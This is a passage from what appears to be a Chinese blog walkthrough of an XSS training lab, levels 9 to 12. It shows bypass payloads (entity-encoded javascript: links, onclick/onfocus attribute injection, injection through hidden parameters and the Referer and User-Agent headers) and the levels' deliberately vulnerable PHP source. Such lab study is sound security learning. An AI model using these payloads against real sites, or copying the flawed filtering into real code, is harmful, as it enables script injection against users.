<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&amp;<span class="comment">#x006a&amp;#x0061&amp;#x0076&amp;#x0061&amp;#x0073&amp;#x0063&amp;#x0072&amp;#x0069&amp;#x0070&amp;#x0074&amp;#x003a&amp;#x0061&amp;#x006c&amp;#x0065&amp;#x0072&amp;#x0074&amp;#x0028&amp;#x0027&amp;#x0031&amp;#x0032&amp;#x0033&amp;#x0027&amp;#x0029&amp;#x0020&amp;#x002f&amp;#x002a&amp;#x0068&amp;#x0074&amp;#x0074&amp;#x0070&amp;#x003a&amp;#x002f&amp;#x002f&amp;#x002a&amp;#x002f</span></span><br><span class="line">上述为javascript:<span class="title function_ invoke__">alert</span>(<span class="string">&#x27;123&#x27;</span>) <span class="comment">/*http://*/</span> unicode编码的结果</span><br></pre></td></tr></table></figure>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_34.png" class="" title="在这里插入图片描述">

<ul>
<li>插入失败，这是为什么呢？</li>
</ul>
<p>分析原因：</p>
<blockquote>
<p>unicode编码后的字符会被浏览器自动解码，但是服务器不会解码（指后端没有对unicode解码的代码程序），所以后端代码接受到的是一堆‘奇怪’字符，由于没有严格识别到http:&#x2F;&#x2F; ，所以不会将变量值拼拼接<br>解决措施：</p>
<blockquote>
<p>对于javascript的script中任意(不限数量)字符进行unicode编码</p>
</blockquote>
</blockquote>
<p>输入语句：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">javascrip&amp;<span class="comment">#x0074:alert(&#x27;123&#x27;) /*http://*/ </span></span><br><span class="line">t  -&gt; &amp;<span class="comment">#x0074</span></span><br></pre></td></tr></table></figure>
<p>成功通关</p>
<p>源码分析：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">&quot;content-type&quot;</span> content=<span class="string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"></span>&#123;     </span><br><span class="line"><span class="title function_ invoke__">confirm</span>(<span class="string">&quot;完成的不错！&quot;</span>);</span><br><span class="line"> window.location.href=<span class="string">&quot;level10.php?keyword=well done!&quot;</span>; </span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level9&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align=center&gt;欢迎来到level9&lt;/h1&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>]);</span><br><span class="line"><span class="variable">$str2</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;script&quot;</span>,<span class="string">&quot;scr_ipt&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$str3</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;on&quot;</span>,<span class="string">&quot;o_n&quot;</span>,<span class="variable">$str2</span>);</span><br><span class="line"><span class="variable">$str4</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;src&quot;</span>,<span class="string">&quot;sr_c&quot;</span>,<span class="variable">$str3</span>);</span><br><span class="line"><span class="variable">$str5</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>,<span class="string">&quot;da_ta&quot;</span>,<span class="variable">$str4</span>);</span><br><span class="line"><span class="variable">$str6</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;href&quot;</span>,<span class="string">&quot;hr_ef&quot;</span>,<span class="variable">$str5</span>);</span><br><span class="line"><span class="variable">$str7</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&quot;&#x27;</span>,<span class="string">&#x27;&amp;quot&#x27;</span>,<span class="variable">$str6</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level9.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&#x27;&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=添加友情链接 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="literal">false</span>===<span class="title function_ invoke__">strpos</span>(<span class="variable">$str7</span>,<span class="string">&#x27;http://&#x27;</span>))    <span class="comment">//判断变量值是否存在字串 ‘http://’</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;您的链接不合法？有没有！&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&#x27;</span>.<span class="variable">$str7</span>.<span class="string">&#x27;&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#x27;</span>;  <span class="comment">//存在则直接拼接</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;center&gt;&lt;img src=level9.png&gt;&lt;/center&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h3 align=center&gt;payload的长度:&quot;</span>.<span class="title function_ invoke__">strlen</span>(<span class="variable">$str7</span>).<span class="string">&quot;&lt;/h3&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<hr>
<h2 id="level10"><a href="#level10" class="headerlink" title="level10"></a>level10</h2><p>类型: url类型</p>
<p>解题思路：</p>
<p>输入一些测试语句（<script>alert(&#39;123&#39;);</script>）</p>
<p>但回显结果类似于：</p>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_35.png" class="" title="在这里插入图片描述">

<ul>
<li>插入的语句被实例化，且无法准确有效地判断过滤特征或触发的行为结果–&gt;可能就不是这个参数（keyword&#x3D;）</li>
</ul>
<h3 id="隐藏标签"><a href="#隐藏标签" class="headerlink" title="*隐藏标签"></a>*隐藏标签</h3><blockquote>
<p>1.一些网站的后端可以接受隐藏的input标签的参数<br>2.隐藏input标签的目的是：后端需要input的返回值，但有不想用户看见—&gt;这种情况经常出现<br>3.hidden下的input标签的赋值往往是通过js代码的逻辑进行赋值，也存在通过post，get请求获取值</p>
</blockquote>
<ul>
<li>与前面关卡不同的是：有大量隐藏的input标签（hidden）</li>
</ul>
<p>测试使用get请求对隐藏的input标签赋值：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(%27123%27);<span class="tag">&lt;/<span class="name">script</span>&gt;</span>&amp;t_link=123&amp;t_history=456&amp;t_sort=789</span><br></pre></td></tr></table></figure>

<p>回显结果：</p>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_36.png" class="" title="在这里插入图片描述">
<p>总共有四个键值对，探测出第四个键值对可能存在xss</p>
<p>输入：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;t_sort=&quot;&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&quot;123&quot;</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> </span><br></pre></td></tr></table></figure>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_37.png" class="" title="在这里插入图片描述">
<p>键值对以&amp;分割，不用担心keyword将后面的语句当作值</p>
<p>回显结果：</p>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_38.png" class="" title="在这里插入图片描述">

<ul>
<li>回显的结果与第四关类似</li>
</ul>
<p>输入语句：（插属性）</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&amp;t_sort=&quot; onclick=&#x27;alert(&quot;123&quot;)&#x27; type=&#x27;text&#x27; //</span><br><span class="line">onclick 需要自主点击，所以需要’显示‘</span><br></pre></td></tr></table></figure>

<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_39.png" class="" title="在这里插入图片描述">

<p>页面渲染：（多了一个输入文本框）</p>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_40.png" class="" title="在这里插入图片描述">
<p>点击即可通关</p>
<h3 id="趣事-1"><a href="#趣事-1" class="headerlink" title="*趣事"></a>*趣事</h3><p>—–&gt;有趣的是将括号里面的双引号改为单引号就无法成功插入<br>即输入：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;t_sort=&quot; onclick=&#x27;alert(&#x27;123&#x27;)&#x27; type=&#x27;text&#x27;  //</span><br></pre></td></tr></table></figure>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_41.png" class="" title="在这里插入图片描述">
<blockquote>
<p>分析： onclick&#x3D;’alert(‘123’)’<br>1.浏览器将 前两个单引号看作一组即’alert(‘   –&gt;转为双赢号，即”alert(“    （标签属性后面浏览器都会单引号转为双引号）<br>2.对于剩下的 ‘)’  ，不是任何属性的值，不将单引号转为双引号，被当作属性或标签呈现蓝色</p>
</blockquote>
<ul>
<li>经验总结：使用多个相同的引号要注意浏览的识别规则</li>
</ul>
<p>补充：自动点击测试</p>
<p>输入：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&amp;t_sort=&quot; onfocus=&#x27;alert(&quot;123&quot;)&#x27; type=&#x27;text &#x27; autofocus&quot;    </span><br><span class="line">autofocus是独立属性</span><br></pre></td></tr></table></figure>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_42.png" class="" title="在这里插入图片描述">
<p>没有自动点击（）原因是尾部存在双引号–&gt;语法错误</p>
<p>测试：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&amp;t_sort=&quot; onfocus=&#x27;alert(&quot;123&quot;)&#x27; type=&#x27;text&#x27;  autofocus //</span><br><span class="line">实为：<span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;t_sort&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span> <span class="attr">onfocus</span>=<span class="string">&#x27;alert(123)&#x27;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">autofocus</span>&gt;</span></span><br><span class="line"></span><br><span class="line">&amp;t_sort=&quot; onfocus=&#x27;alert(&quot;123&quot;)&#x27; autofocus type=&#x27;text&#x27; </span><br><span class="line">实为：<span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;t_sort&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span> <span class="attr">onfocus</span>=<span class="string">&#x27;alert(123)&#x27;</span> <span class="attr">autofocus</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>实现自动点击</p>
<p>因此，注入的语句最后在尾部加注释（具体情况具体分析）</p>
<p>源码分析：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">&quot;content-type&quot;</span> content=<span class="string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"></span>&#123;     </span><br><span class="line"><span class="title function_ invoke__">confirm</span>(<span class="string">&quot;完成的不错！&quot;</span>);</span><br><span class="line"> window.location.href=<span class="string">&quot;level11.php?keyword=good job!&quot;</span>; </span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level10&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align=center&gt;欢迎来到level10&lt;/h1&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line"><span class="variable">$str11</span> = <span class="variable">$_GET</span>[<span class="string">&quot;t_sort&quot;</span>];  <span class="comment">// 接受t_sort的参数 </span></span><br><span class="line"><span class="variable">$str22</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str11</span>);</span><br><span class="line"><span class="variable">$str33</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str22</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;</span>.<span class="variable">$str33</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;   </span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;center&gt;&lt;img src=level10.png&gt;&lt;/center&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h3 align=center&gt;payload的长度:&quot;</span>.<span class="title function_ invoke__">strlen</span>(<span class="variable">$str</span>).<span class="string">&quot;&lt;/h3&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<hr>
<h2 id="level11"><a href="#level11" class="headerlink" title="level11"></a>level11</h2><p>类型：url类型</p>
<p>解题思路：</p>
<p>没有输入任何语句，检查页面：</p>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_43.png" class="" title="在这里插入图片描述">


<ul>
<li>包含多个隐藏标签</li>
<li>其中一个input标签存在值，是上一关注入的payload</li>
</ul>
<p>删除level11关页面后，用目录页面访问level11关，回显结果为：</p>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_44.png" class="" title="在这里插入图片描述">

<ul>
<li>分析得出，t_ref的值记录的是从个网址访问的</li>
<li>可以推断出，后端将数据包中referer栏的地址拼接到value</li>
</ul>
<h3 id="Referer"><a href="#Referer" class="headerlink" title="*Referer"></a>*Referer</h3><p>刷新页面，抓取数据包：修改数据包中的Referer，即可完成payload注入</p>
<p>修改为：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; onclick=&#x27;alert(&quot;123&quot;)&#x27; type=&#x27;text&#x27; //</span><br></pre></td></tr></table></figure>

<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_45.png" class="" title="在这里插入图片描述">
<p>页面渲染：</p>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_46.png" class="" title="在这里插入图片描述">
<p>点击即可通关</p>
<p>源码分析：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">&quot;content-type&quot;</span> content=<span class="string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"></span>&#123;     </span><br><span class="line"><span class="title function_ invoke__">confirm</span>(<span class="string">&quot;完成的不错！&quot;</span>);</span><br><span class="line"> window.location.href=<span class="string">&quot;level12.php?keyword=good job!&quot;</span>; </span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level11&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align=center&gt;欢迎来到level11&lt;/h1&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line"><span class="variable">$str00</span> = <span class="variable">$_GET</span>[<span class="string">&quot;t_sort&quot;</span>];</span><br><span class="line"><span class="variable">$str11</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_REFERER&#x27;</span>]; <span class="comment">//获取Referer </span></span><br><span class="line"><span class="variable">$str22</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str11</span>);</span><br><span class="line"><span class="variable">$str33</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str22</span>);  <span class="comment">//这里进行替换，可以选择插入属性</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str00</span>).<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_ref&quot;  value=&quot;&#x27;</span>.<span class="variable">$str33</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;center&gt;&lt;img src=level11.png&gt;&lt;/center&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h3 align=center&gt;payload的长度:&quot;</span>.<span class="title function_ invoke__">strlen</span>(<span class="variable">$str</span>).<span class="string">&quot;&lt;/h3&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<hr>
<h2 id="level12"><a href="#level12" class="headerlink" title="level12"></a>level12</h2><p>类型： url类型</p>
<p>与11关类似，不再过多演示</p>
<h3 id="HTTP-USER-AGENT"><a href="#HTTP-USER-AGENT" class="headerlink" title="*HTTP_USER_AGENT"></a>*HTTP_USER_AGENT</h3><img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_47.png" class="" title="在这里插入图片描述">
<p>修改为：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&quot; onclick=&#x27;alert(&quot;123&quot;)&#x27; type=&#x27;text&#x27; //  </span><br><span class="line">上述语句失败-拼接value前双引号被实例化转义</span><br><span class="line">继续修改：</span><br><span class="line">&quot; onclick=alert(&#x27;123&#x27;) type=&#x27;text&#x27; //  </span><br><span class="line">成功绕过   </span><br><span class="line">细节：防止识别错误，除去alert两侧的单引号</span><br></pre></td></tr></table></figure>
<p>源码分析：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">&quot;content-type&quot;</span> content=<span class="string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"></span>&#123;     </span><br><span class="line"><span class="title function_ invoke__">confirm</span>(<span class="string">&quot;完成的不错！&quot;</span>);</span><br><span class="line"> window.location.href=<span class="string">&quot;level13.php?keyword=good job!&quot;</span>; </span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level12&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align=center&gt;欢迎来到level12&lt;/h1&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line"><span class="variable">$str00</span> = <span class="variable">$_GET</span>[<span class="string">&quot;t_sort&quot;</span>];</span><br><span class="line"><span class="variable">$str11</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>];  <span class="comment">//获取代理信息</span></span><br><span class="line"><span class="variable">$str22</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str11</span>);</span><br><span class="line"><span class="variable">$str33</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str22</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str00</span>).<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_ua&quot;  value=&quot;&#x27;</span>.<span class="variable">$str33</span>.<span class="string">&#x27;&quot; 